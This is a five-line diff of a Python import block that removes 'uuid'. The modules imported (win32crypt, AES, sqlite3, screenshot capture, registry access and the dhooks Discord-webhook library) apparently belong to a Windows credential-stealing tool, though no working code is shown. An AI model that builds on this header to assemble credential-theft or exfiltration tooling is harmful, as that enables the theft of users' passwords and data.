@@ -1,5 +1,5 @@
 import sqlite3, ctypes, mss, sys, ctypes, winreg, pygetwindow
-import os, wmi, win32api, platform, uuid, psutil, time, GPUtil
+import os, wmi, win32api, platform, psutil, time, GPUtil
 import shutil, pythoncom
 import base64, win32crypt, json, threading, requests, dhooks, re, subprocess
 from Crypto.Cipher import AES
